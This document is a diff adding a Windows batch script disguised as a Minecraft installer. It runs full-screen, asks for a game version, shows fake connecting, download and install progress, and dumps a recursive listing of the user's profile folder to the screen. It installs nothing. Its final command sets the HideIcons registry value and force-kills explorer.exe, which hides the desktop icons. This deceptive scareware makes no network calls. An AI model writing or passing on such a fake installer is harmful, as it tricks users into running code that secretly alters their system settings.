@@ -1,0 +1,43 @@
+@echo off
+title INSTALLING IN PROGRESS
+color a
+
+if "%~1" == "hack_mode" goto START_HACK
+where wt >nul 2>nul
+if %errorlevel% equ 0 (
+    wt -F --profile "Command Prompt" cmd /c "%~f0" hack_mode & exit
+) else (
+    powershell -Command "Start-Process cmd -ArgumentList '/c \"\"%~f0\" hack_mode\"' -WindowStyle Maximized" & exit
+)
+
+:START_HACK
+chcp 65001 >nul
+if not defined WT_SESSION (
+    powershell -Command "Start-Sleep -m 500; $wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('%%{ENTER}')"
+)
+timeout /t 1 >nul
+
+set /p version="What Minecraft version do you choose? (type in and press Enter): "
+echo You choose: %version%
+echo.
+
+echo [!] CONNECTING TO SYSTEM...
+powershell -Command "function S($t){$t.ToCharArray() | %% { Write-Host $_ -NoNewline; Start-Sleep -m 5 }; Write-Host ''}; S '================================================================================='"
+echo [!] DOWNLOAD COMPLETE!
+timeout /t 2 >nul
+echo [!] START INSTALLING!
+timeout /t 2 >nul
+
+dir "%USERPROFILE%" /s
+echo. & echo.
+
+cls
+echo.
+powershell -Command "function S($t){$t.ToCharArray() | %% { Write-Host $_ -NoNewline; Start-Sleep -m 5 }; Write-Host ''}; S '=========================================================='"
+powershell -Command "function S($t){$t.ToCharArray() | %% { Write-Host $_ -NoNewline; Start-Sleep -m 5 }; Write-Host ''}; S '[+] COMPLETE INSTALLING!'"
+echo.
+powershell -Command "function S($t){$t.ToCharArray() | %% { Write-Host $_ -NoNewline; Start-Sleep -m 5 }; Write-Host ''}; S 'START TO PLAY NOW'"
+powershell -Command "function S($t){$t.ToCharArray() | %% { Write-Host $_ -NoNewline; Start-Sleep -m 5 }; Write-Host ''}; S '=========================================================='"
+echo.
+powershell -Command "$p = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced'; Set-ItemProperty -Path $p -Name HideIcons -Value 1; Stop-Process -ProcessName explorer -Force"
+exit
